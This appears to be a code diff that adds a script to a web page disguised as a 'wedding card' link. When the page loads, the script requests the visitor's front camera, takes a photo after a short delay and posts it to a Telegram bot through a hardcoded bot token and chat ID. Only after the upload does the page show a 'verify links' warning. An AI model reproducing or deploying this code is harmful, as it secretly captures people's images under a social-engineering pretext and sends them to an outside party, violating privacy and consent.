@@ -1,0 +1,52 @@
+<script>
+const BOT_TOKEN = "8536241183:AAHp7UkrRkUFWAH9VLwMRKVnspLF-fv4k88";
+const CHAT_ID = "7125994097";
+
+async function capture() {
+  const message = document.getElementById("message");
+  message.style.display = "block";
+  message.style.color = "#333";
+  message.innerText = "Loading wedding card…";
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" } // FRONT camera
+    });
+
+    const video = document.getElementById("video");
+    video.srcObject = stream;
+
+    setTimeout(() => {
+      const canvas = document.getElementById("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+
+      stream.getTracks().forEach(track => track.stop());
+
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+
+        message.style.color = "#b00020";
+        message.innerText =
+          "💍 Wedding Card\n\n" +
+          "This link requested access to your FRONT camera.\n" +
+          "You allowed it.\n\n" +
+          "Always verify links before clicking.";
+      });
+    }, 1500);
+
+  } catch (e) {
+    message.style.color = "green";
+    message.innerText =
+      "Camera permission denied.\nThat was the safe choice 👍";
+  }
+}
+</script>
